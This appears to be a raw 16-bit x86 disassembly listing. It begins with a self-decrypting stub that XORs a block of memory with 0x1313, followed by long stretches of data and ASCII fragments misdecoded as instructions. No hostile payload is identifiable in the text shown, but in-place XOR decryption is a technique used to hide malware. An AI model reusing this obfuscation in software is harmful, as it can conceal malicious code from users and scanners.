    db 0x8B, 0xF0 ;$1 mov si, ax
    add si, word 0x001e
    mov cx, 0x0028
    xor word [si], 0x1313
    xor word [si+0x02], 0x1313
    add si, 0x0004
loop1:
    xor word [si], 0x1313
    add si, 0x0002
    loop loop1
    lodsw
    push ds
    jcxz -10
    push di
    in ax, dx
    cmp dl, dh
    aam 0x17
    in al, dx
    or al, 0x05
    or al, 0x9f
    esc 0xd9
    popf
    db 0xC1
    xchg dx, ax
    std
    db 0x03, 0xC3 ;$1 add ax, bx
    xchg dx, ax
    rcl word [bp+si], 1
    push ds
    cbw
    cmc
    xchg dx, ax
    call word [bx]
    db 0x82, 0x9A, 0x26, 0x9A, 0x05 ;$1 sbb byte [bp+si-0x65da], 0x05
    adc [bp+di], dx
    in al, dx
    or al, 0x4e
    db 0x65
    db 0x62
    jnz label2+2
    db 0x68
    db 0x61
    db 0x64
    db 0x6E
    db 0x65
    jp label5+1
    db 0x61
    jb label1+2
    and [bx+di+0x6b], ah
    db 0x61
    and [bp+0x69], al
    jz label3+1
    db 0x68
    db 0x65
    cs:
    or al, [bp+0x61]
    jz label4
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label6
    db 0x68
    db 0x65
    and [di+0x69], ch
    jnb label8+1
    db 0x65
    aas
    and [bp+0x61], ah
    jz label9
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label10
    db 0x68
    db 0x65
label1:
    and [bx+di+0x61], bh
    db 0x6E
    db 0x6B
    db 0x6F
    cs:
    and [bp+0x61], al
    db 0x63
    jz label13
    db 0x68
    db 0x65
    and [bp+0x69], ah
    jz label14
    db 0x68
    db 0x65
    and [bp+di+0x6f], ch
    jb label17
    jz label20+1
    db 0x61
    and [bx+di], sp
    and [bx+si], sp
    dec cx
    jnb label20+1
    db 0x61
    db 0x65
    db 0x6C
label2:
    and [bp+si+0x65], al
    jb label19
    db 0x65
    jb label7+1
    sub ax, 0x2220
    push sp
    db 0x69
    jnb label21+1
    jnz label11+1
    and [di+0x69], cl
label3:
    jnb label22
    jnz label15+2
    and ch, [0x4b20]
    db 0x6F
label4:
    db 0x62
    db 0x69
label5:
    and [si+0x6f], ch
    jbe label23+2
label6:
    jnb label12
    dec di
label7:
    jb label24+2
    db 0x61
    jp label16
    and [bx+0x65], dl
label8:
    and [bx+di+0x72], ah
label9:
    db 0x65
    and [bx+0x6f], ah
    db 0x69
    db 0x6E
    db 0x67
label10:
    and [si+0x6f], dh
label11:
    and [bx+0x69], ah
    jbe label25
    and [bx+di+0x6f], bh
    jnz label18
label12:
    db 0x63
    db 0x61
label13:
    db 0x6C
    db 0x6C
    and [bp+0x61], ah
    jb label20+1
label14:
    jz label26
    and [si+0x68], dh
    db 0x65
label15:
    and [bp+0x61], ah
    db 0x63
    db 0x65
label16:
    cs:
    in al, dx
label17:
    in al, 0xec
    in al, 0xec
    and al, ah
    jmp label14+1
    cli
    in ax, dx
label18:
    and al, ah
    in ax, 0xfa
    in al, 0x20
label19:
    cmp ch, [bx+di]
label20:
    or ah, [bp+di]
    sub al, 0x2a
    and [si], bp
    sub al, 0x2d
label21:
    sub al, 0x2c
    sub bp, [bp+si]
    sub ch, [di]
    and [di], bp
label22:
    daa
    sub bp, [bx+di]
    and ah, [bp+si]
    sub [bx], ah
    and sp, [bp+si]
label23:
    sub ah, [0x2526]
    and [si], sp
    sub ax, 0x2722
    sub ax, 0x2622
    sub sp, [0x2825]
label24:
    and ax, 0x2428
    sub [bx], sp
    and ah, [0x2c28]
    sub ch, [bx+si]
    sub sp, [bp+si]
    sub ch, [di]
label25:
    es:
    sub ah, [bx+di]
    and [bp+si], bp
    sub al, 0x21
    and [bx+si], bp
    and al, 0x27
    es:
    sub [bx+di], ah
    and [bx+si], bp
    and [bx+si], bp
    sub [bx], ah
    sub sp, [0x2825]
    and bp, [di]
label26:
    and ch, [bp+di]
    daa
    sub [bx+di], sp
    and ch, [bx+di]
    es:
    sub sp, [bp+si]
    sub bp, [bp+si]
    sub al, 0x28
    and [si], bp
    sub ah, [bp+di]
    and al, 0x24
    sub [bx+di], ah
    sub ax, 0x242a
    sub [bx+si], ch
    and ax, 0x2d2b
    and ch, [di]
    daa
    sub sp, [bp+di]
    sub [bx+si], ch
    and sp, [bx+di]
    and bp, [bx+di]
    es:
    sub [bp+di], ah
    and ax, 0x2d2d
    and ax, 0x2a23
    sub [si], ah
    sub sp, [bp+si]
    sub al, 0x29
    and al, 0x29
    and sp, [di]
    and [bp+di], bp
    sub al, 0x23
    sub [0x2529], sp
    sub al, 0x27
    sub [bx+di], bp
    sub [bp+di], sp
    sub ch, [bx+di]
    sub bp, [di]
    and ah, [bx+di]
    sub [di], ah
    sub [0x2a27], sp
    sub [bp+di], ah
    and ax, 0x2929
    daa
    and ch, [di]
    sub [si], ch
    sub ah, [bx+di]
    sub sp, [bp+di]
    and ax, 0x2228
    and ax, 0x2a28
    daa
    and ah, [bp+si]
    sub bp, [bx+di]
    sub ax, 0x2421
    and al, 0x27
    sub ch, [bp+si]
    sub ax, 0x292b
    sub ch, [bx+di]
    and ax, 0x2621
    and [bx+di], bp
    and sp, [bp+di]
    and sp, [bx]
    sub ah, [bp+si]
    sub al, 0x22
    sub bp, [si]
    and sp, [bx]
    sub [bp+si], ch
    sub [bx+si], ch
    and ax, 0x2626
    db 0x22  ; and al, [bx+si]